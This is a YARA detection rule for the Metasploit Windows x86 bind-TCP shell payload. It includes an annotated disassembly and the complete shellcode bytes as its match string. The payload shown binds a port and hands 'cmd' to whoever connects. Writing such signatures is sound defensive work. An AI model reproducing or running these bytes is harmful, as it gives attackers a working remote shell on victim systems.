
    rule single_shell_bind_tcp___start0___x86
    {
        meta:
            desc = "Metasploit::windows::x86::single_shell_bind_tcp::__start0__"
    
        /*
            FC                   | .                    | cld
            6AEB                 | j.                   | push byte -0x15
            4D                   | M                    | dec ebp
            E8F9FFFFFF           | .....                | call 0x2
            60                   | `                    | pusha
            8B6C2424             | .l$$                 | mov ebp,[esp+0x24]
            8B453C               | .E<                  | mov eax,[ebp+0x3c]
            8B7C0578             | .|.x                 | mov edi,[ebp+eax+0x78]
            01EF                 | ..                   | add edi,ebp
            8B4F18               | .O.                  | mov ecx,[edi+0x18]
            8B5F20               | ._                   | mov ebx,[edi+0x20]
            01EB                 | ..                   | add ebx,ebp
            49                   | I                    | dec ecx
            8B348B               | .4.                  | mov esi,[ebx+ecx*4]
            01EE                 | ..                   | add esi,ebp
            31C0                 | 1.                   | xor eax,eax
            99                   | .                    | cdq
            AC                   | .                    | lodsb
            84C0                 | ..                   | test al,al
            0F8403000000         | ......               | jz 0x34
            C1CA0D               | ...                  | ror edx,0xd
            01C2                 | ..                   | add edx,eax
            EBF0                 | ..                   | jmp short 0x28
            3B542428             | ;T$(                 | cmp edx,[esp+0x28]
            0F85DDFFFFFF         | ......               | jnz 0x1f
            8B5F24               | ._$                  | mov ebx,[edi+0x24]
            01EB                 | ..                   | add ebx,ebp
            668B0C4B             | f..K                 | mov cx,[ebx+ecx*2]
            8B5F1C               | ._.                  | mov ebx,[edi+0x1c]
            01EB                 | ..                   | add ebx,ebp
            032C8B               | .,.                  | add ebp,[ebx+ecx*4]
            896C241C             | .l$.                 | mov [esp+0x1c],ebp
            61                   | a                    | popa
            C3                   | .                    | ret
            31DB                 | 1.                   | xor ebx,ebx
            648B4330             | d.C0                 | mov eax,[fs:ebx+0x30]
            8B400C               | .@.                  | mov eax,[eax+0xc]
            8B701C               | .p.                  | mov esi,[eax+0x1c]
            AD                   | .                    | lodsd
            8B4008               | .@.                  | mov eax,[eax+0x8]
            5E                   | ^                    | pop esi
            688E4E0EEC           | h.N..                | push dword 0xec0e4e8e
            50                   | P                    | push eax
            FFD6                 | ..                   | call esi
            6653                 | fS                   | push bx
            66683332             | fh32                 | push word 0x3233
            687773325F           | hws2_                | push dword 0x5f327377
            54                   | T                    | push esp
            FFD0                 | ..                   | call eax
            68CBEDFC3B           | h...;                | push dword 0x3bfcedcb
            50                   | P                    | push eax
            FFD6                 | ..                   | call esi
            5F                   | _                    | pop edi
            89E5                 | ..                   | mov ebp,esp
            6681ED0802           | f....                | sub bp,0x208
            55                   | U                    | push ebp
            6A02                 | j.                   | push byte +0x2
            FFD0                 | ..                   | call eax
            68D909F5AD           | h....                | push dword 0xadf509d9
            57                   | W                    | push edi
            FFD6                 | ..                   | call esi
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            43                   | C                    | inc ebx
            53                   | S                    | push ebx
            43                   | C                    | inc ebx
            53                   | S                    | push ebx
            FFD0                 | ..                   | call eax
            6668115C             | fh.\                 | push word 0x5c11
            6653                 | fS                   | push bx
            89E1                 | ..                   | mov ecx,esp
            95                   | .                    | xchg eax,ebp
            68A41A70C7           | h..p.                | push dword 0xc7701aa4
            57                   | W                    | push edi
            FFD6                 | ..                   | call esi
            6A10                 | j.                   | push byte +0x10
            51                   | Q                    | push ecx
            55                   | U                    | push ebp
            FFD0                 | ..                   | call eax
            68A4AD2EE9           | h....                | push dword 0xe92eada4
            57                   | W                    | push edi
            FFD6                 | ..                   | call esi
            53                   | S                    | push ebx
            55                   | U                    | push ebp
            FFD0                 | ..                   | call eax
            68E5498649           | h.I.I                | push dword 0x498649e5
            57                   | W                    | push edi
            FFD6                 | ..                   | call esi
            50                   | P                    | push eax
            54                   | T                    | push esp
            54                   | T                    | push esp
            55                   | U                    | push ebp
            FFD0                 | ..                   | call eax
            93                   | .                    | xchg eax,ebx
            68E779C679           | h.y.y                | push dword 0x79c679e7
            57                   | W                    | push edi
            FFD6                 | ..                   | call esi
            55                   | U                    | push ebp
            FFD0                 | ..                   | call eax
            666A64               | fjd                  | o16 push byte +0x64
            6668636D             | fhcm                 | push word 0x6d63
            89E5                 | ..                   | mov ebp,esp
            6A50                 | jP                   | push byte +0x50
            59                   | Y                    | pop ecx
            29CC                 | ).                   | sub esp,ecx
            89E7                 | ..                   | mov edi,esp
            6A44                 | jD                   | push byte +0x44
            89E2                 | ..                   | mov edx,esp
            31C0                 | 1.                   | xor eax,eax
            F3AA                 | ..                   | rep stosb
            FE422D               | .B-                  | inc byte [edx+0x2d]
            FE422C               | .B,                  | inc byte [edx+0x2c]
            93                   | .                    | xchg eax,ebx
            8D7A38               | .z8                  | lea edi,[edx+0x38]
            AB                   | .                    | stosd
            AB                   | .                    | stosd
            AB                   | .                    | stosd
            6872FEB316           | hr...                | push dword 0x16b3fe72
            FF7544               | .uD                  | push dword [ebp+0x44]
            FFD6                 | ..                   | call esi
            5B                   | [                    | pop ebx
            57                   | W                    | push edi
            52                   | R                    | push edx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            6A01                 | j.                   | push byte +0x1
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            55                   | U                    | push ebp
            51                   | Q                    | push ecx
            FFD0                 | ..                   | call eax
            68ADD905CE           | h....                | push dword 0xce05d9ad
            53                   | S                    | push ebx
            FFD6                 | ..                   | call esi
            6AFF                 | j.                   | push byte -0x1
            FF37                 | .7                   | push dword [edi]
            FFD0                 | ..                   | call eax
            8B57FC               | .W.                  | mov edx,[edi-0x4]
            83C464               | ..d                  | add esp,byte +0x64
            FFD6                 | ..                   | call esi
            52                   | R                    | push edx
            FFD0                 | ..                   | call eax
            68F08A045F           | h..._                | push dword 0x5f048af0
            53                   | S                    | push ebx
            FFD6                 | ..                   | call esi
            FFD0                 | ..                   | call eax
        */
    
        strings:
            $a   = { fc 6a eb 4d e8 f9 ff ff ff 60 8b 6c 24 24 8b 45 3c 8b 7c 05 78 01 ef 8b 4f 18 8b 5f 20 01 eb 49 8b 34 8b 01 ee 31 c0 99 ac 84 c0 0f 84 03 00 00 00 c1 ca 0d 01 c2 eb f0 3b 54 24 28 0f 85 dd ff ff ff 8b 5f 24 01 eb 66 8b 0c 4b 8b 5f 1c 01 eb 03 2c 8b 89 6c 24 1c 61 c3 31 db 64 8b 43 30 8b 40 0c 8b 70 1c ad 8b 40 08 5e 68 8e 4e 0e ec 50 ff d6 66 53 66 68 33 32 68 77 73 32 5f 54 ff d0 68 cb ed fc 3b 50 ff d6 5f 89 e5 66 81 ed 08 02 55 6a 02 ff d0 68 d9 09 f5 ad 57 ff d6 53 53 53 53 53 43 53 43 53 ff d0 66 68 11 5c 66 53 89 e1 95 68 a4 1a 70 c7 57 ff d6 6a 10 51 55 ff d0 68 a4 ad 2e e9 57 ff d6 53 55 ff d0 68 e5 49 86 49 57 ff d6 50 54 54 55 ff d0 93 68 e7 79 c6 79 57 ff d6 55 ff d0 66 6a 64 66 68 63 6d 89 e5 6a 50 59 29 cc 89 e7 6a 44 89 e2 31 c0 f3 aa fe 42 2d fe 42 2c 93 8d 7a 38 ab ab ab 68 72 fe b3 16 ff 75 44 ff d6 5b 57 52 51 51 51 6a 01 51 51 55 51 ff d0 68 ad d9 05 ce 53 ff d6 6a ff ff 37 ff d0 8b 57 fc 83 c4 64 ff d6 52 ff d0 68 f0 8a 04 5f 53 ff d6 ff d0 }
    
        condition:
            any of them
    }
    
    